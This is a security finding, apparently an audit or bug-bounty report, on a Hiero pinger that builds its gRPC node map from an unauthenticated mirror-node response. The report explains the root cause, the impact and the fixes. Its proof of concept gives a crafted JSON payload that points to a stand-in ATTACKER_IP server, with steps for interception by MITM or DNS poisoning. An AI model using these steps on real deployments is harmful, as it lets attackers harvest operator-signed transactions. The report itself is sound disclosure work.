### Title
Unauthenticated Mirror Node Response Fully Controls gRPC Network Map, Redirecting All Signed Transactions to Attacker Infrastructure

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` unconditionally trusts the JSON body returned by the configured mirror node REST endpoint to build the entire gRPC network map. An attacker who controls the mirror node (or can MITM the HTTP connection to it) can return a crafted `nodesEnvelope` whose `ServiceEndpoints` point exclusively to attacker-controlled gRPC servers. Because the resulting `map[string]hiero.AccountID` is passed directly to `hiero.ClientForNetwork()` and the operator key is then set on that client, every subsequent `CryptoTransfer` is signed with the operator's private key and submitted solely to attacker infrastructure.

### Finding Description

**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 74–132, called from `buildNetworkFromMirrorNodes()` → `newClient()` (`sdk_client.go` line 18–22).

**Root cause — blind trust of mirror node response:**

After a successful HTTP 2xx response, the function decodes the body into `nodesEnvelope` and iterates over every `nodeEntry` and every `serviceEndpoint` within it:

```go
// lines 102–124
for _, n := range payload.Nodes {
    ...
    for _, ep := range n.ServiceEndpoints {
        host := strings.TrimSpace(ep.DomainName)
        if host == "" {
            host = strings.TrimSpace(ep.IPAddressV4)
        }
        if host == "" || ep.Port == 0 {
            continue
        }
        addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
        network[addr] = nodeAccountId
    }
}
```

The only guard is:

```go
// lines 127–129
if len(network) == 0 {
    return nil, false, fmt.Errorf("no usable service_endpoints found from %s", url)
}
```

There is **no allowlist of expected IP ranges or domain suffixes**, **no minimum node count**, **no cross-validation with a secondary source**, and **no TLS certificate pinning** on the `http.Client` (line 46 of `mirror_node_client.go`). The example deployment URL (`http://mirror-rest:5551`) is plain HTTP, making network-level MITM trivial.

**How the poisoned map propagates:**

```go
// sdk_client.go lines 18–22
netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
...
client = hiero.ClientForNetwork(netmap)   // attacker endpoints installed
...
client.SetOperator(opID, opKey)           // operator key bound to poisoned client
```

Every call to `cryptoTransfer.Execute(client)` in `transfer.go` (line 33) then signs the transaction with the operator's private key and dispatches it to the attacker's gRPC server.

### Impact Explanation

- **Transaction redirection:** All operator-signed `CryptoTransfer` transactions are delivered exclusively to attacker-controlled gRPC endpoints. The legitimate Hiero network never sees them.
- **Signed transaction harvesting:** The attacker receives fully signed, valid transactions. Depending on the Hiero network's replay-protection window, these could be replayed or used to fingerprint the operator's activity.
- **Denial of service:** Dropping all received transactions silently prevents the pinger from ever succeeding, defeating its monitoring purpose.
- **Severity: High** — confidentiality (signed tx exposure) + integrity (tx never reach real nodes) + availability (monitoring broken).

### Likelihood Explanation

- **Precondition:** `network=other` must be configured (the only path that calls `fetchMirrorNodeNetwork`). This is the intended path for private/custom deployments, which are exactly the environments where a self-hosted or third-party mirror node is used.
- **Attack surface:** Plain HTTP (`http://mirror-rest:5551`) is the documented example; any on-path network attacker (compromised container network, ARP spoofing, DNS poisoning) can inject a malicious response with zero cryptographic barrier.
- **Even with HTTPS:** An attacker who legitimately operates the mirror node the operator points to (e.g., a third-party mirror node service) already holds a valid certificate and can serve a malicious response with no MITM needed.
- **Repeatability:** The network map is built once at startup and never refreshed, so a single poisoned response persists for the entire lifetime of the pinger process.

### Recommendation

1. **Enforce a minimum node count:** Reject any response that returns fewer than a configurable threshold (e.g., 3) distinct nodes.
2. **Allowlist endpoint domains/CIDRs:** Accept only `ServiceEndpoints` whose `domain_name` or `ip_address_v4` matches a configured set of trusted suffixes or CIDR ranges.
3. **Require TLS for the mirror REST URL:** Validate that `cfg.mirrorRest` uses `https://` and configure the `http.Client` with a pinned CA or at minimum enforce `tls.Config{MinVersion: tls.VersionTLS12}`.
4. **Cross-validate with a secondary source:** Optionally fetch the node list from a second, independently configured mirror node and require consensus before accepting the result.
5. **Periodic refresh with change detection:** If the network map is ever refreshed at runtime, alert and refuse to apply a new map that removes more than N% of previously known nodes.

### Proof of Concept

**Preconditions:**
- Pinger deployed with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551` (plain HTTP, typical internal deployment).
- Attacker has network-level access to intercept traffic between the pinger container and `mirror-rest:5551` (e.g., same Kubernetes namespace, ARP spoofing, or DNS hijack).

**Steps:**

1. Stand up a malicious HTTP server at the attacker's IP that responds to `GET /api/v1/network/nodes` with:
```json
{
  "nodes": [
    {
      "node_account_id": "0.0.3",
      "service_endpoints": [
        { "ip_address_v4": "ATTACKER_IP", "port": 50211 }
      ]
    }
  ],
  "links": { "next": null }
}
```

2. Stand up a malicious gRPC server at `ATTACKER_IP:50211` that accepts `CryptoTransfer` RPCs and logs the raw signed transaction bytes.

3. Intercept (or DNS-poison) the HTTP request from the pinger to `mirror-rest:5551` and return the above JSON.

4. `fetchMirrorNodeNetwork()` returns `{"ATTACKER_IP:50211": AccountID{0,0,3}}` — passes the `len(network) == 0` check.

5. `hiero.ClientForNetwork(netmap)` installs only the attacker's endpoint; `client.SetOperator(opID, opKey)` binds the operator key.

6. On every ticker tick, `submitWithRetry` → `cryptoTransfer.Execute(client)` signs a `CryptoTransfer` with the operator's private key and sends it to `ATTACKER_IP:50211`.

7. The attacker's gRPC server logs fully signed, operator-authorized transactions. The legitimate Hiero network receives nothing. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** pinger/mirror_node_client.go (L100-129)
```go
	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
	}

	if len(network) == 0 {
		return nil, false, fmt.Errorf("no usable service_endpoints found from %s", url)
	}
```

**File:** pinger/sdk_client.go (L17-45)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)

	case "testnet", "previewnet", "mainnet":
		c, err := hiero.ClientForName(cfg.network)
		if err != nil {
			return nil, err
		}
		client = c

	default:
		return nil, fmt.Errorf("unknown network %q (testnet|previewnet|mainnet|other)", cfg.network)
	}

	opID, err := hiero.AccountIDFromString(cfg.operatorID)
	if err != nil {
		return nil, fmt.Errorf("invalid operator id: %w", err)
	}

	opKey, err := hiero.PrivateKeyFromString(cfg.operatorKey)
	if err != nil {
		return nil, fmt.Errorf("invalid operator key: %w", err)
	}

	client.SetOperator(opID, opKey)
```

**File:** pinger/transfer.go (L29-33)
```go
		cryptoTransfer := hiero.NewTransferTransaction().
			AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
			AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))

		resp, err := cryptoTransfer.Execute(client)
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```
